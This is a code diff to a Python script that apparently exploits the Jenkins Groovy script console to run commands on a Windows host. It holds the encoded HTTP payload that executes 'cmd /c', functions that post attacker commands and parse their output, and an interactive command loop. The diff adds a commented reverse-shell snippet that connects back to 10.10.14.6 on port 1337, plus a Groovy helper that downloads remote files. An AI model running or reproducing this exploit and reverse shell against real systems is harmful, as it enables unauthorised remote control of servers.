@@ -27,6 +27,21 @@ Content-Length: 688
 script=def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%0D%0Adef+proc+%3D+%27cmd+%2Fc+#COMMAND#%27.execute%28%29%0D%0Aproc.consumeProcessOutput%28sout%2C+serr%29%0D%0Aproc.waitForOrKill%281000%29%0D%0Aprintln+%22out%3E+%24sout+err%3E+%24serr%22&Jenkins-Crumb=bc4f7b806059dd65cbe61482e98071b0&json=%7B%22script%22%3A+%22def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%5Cndef+proc+%3D+%27cmd+%2Fc+dir%27.execute%28%29%5Cnproc.consumeProcessOutput%28sout%2C+serr%29%5Cnproc.waitForOrKill%281000%29%5Cnprintln+%5C%22out%3E+%24sout+err%3E+%24serr%5C%22%22%2C+%22%22%3A+%22%22%2C+%22Jenkins-Crumb%22%3A+%22bc4f7b806059dd65cbe61482e98071b0%22%7D&Submit=Run
 '''
 
+# Create a reverse shell
+# String host="10.10.14.6";
+# int port=1337;
+# String cmd="cmd.exe";
+# Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+# Example groovy script for downloading a file
+# def download(String remoteUrl, String localUrl)
+# {
+#     def file = new FileOutputStream(localUrl)
+#     def out = new BufferedOutputStream(file)
+#     out << new URL(remoteUrl).openStream()
+#     out.close()
+# }
+
 def BuildRequest(command):
     payload = {
         'script': '''def sout = new StringBuffer(), serr = new StringBuffer()
@@ -47,7 +62,7 @@ def ExecuteCommand(command):
     result = requests.post(uri, payload, timeout=5, proxies={'http': 'http://127.0.0.1:8080'}).text.strip()
     start = result.find('Result</h2><pre>out>') + 20
     end = result.find('err>', start)
-    return result[start:end]
+    return result[start:]
 
 if __name__ == '__main__':
     while True:
